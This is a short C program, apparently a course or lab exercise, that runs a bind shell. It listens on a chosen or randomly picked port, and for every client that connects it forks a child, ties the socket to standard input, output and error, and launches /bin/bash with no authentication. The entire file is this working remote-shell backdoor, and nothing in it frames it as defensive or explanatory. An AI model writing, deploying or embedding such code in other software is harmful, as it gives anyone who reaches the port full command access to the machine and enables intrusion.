#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#include "utils_v2.h"
#include "connection_service.h"

void child(void *newsockfd) {
  int socketfd = *(int*) newsockfd;

  dup2(socketfd, STDIN_FILENO);
  dup2(socketfd, STDOUT_FILENO);
  dup2(socketfd, STDERR_FILENO);

  sclose(socketfd);

  sexecl("/bin/bash", BASH, NULL);
}

int main(int argc, char *arg[]) {
  int PORT;
  if (arg[1] != NULL) {
    PORT = atoi(arg[1]);
  } else {
    int random = randomIntBetween(0, NUM_PORTS - 1);
    PORT = PORT_TABLE[random];
  }

  int sockfd = createSocket(PORT);

  int newsockfd;
  
  while(1) {
    newsockfd = saccept(sockfd);

    printf("%d, %d\n", newsockfd, sockfd);

    printf("Client connected.\n");
    fork_and_run1(child, &newsockfd);
  }

  // close connection to client
  sclose(newsockfd);

  // close listen socket
  sclose(sockfd);
}
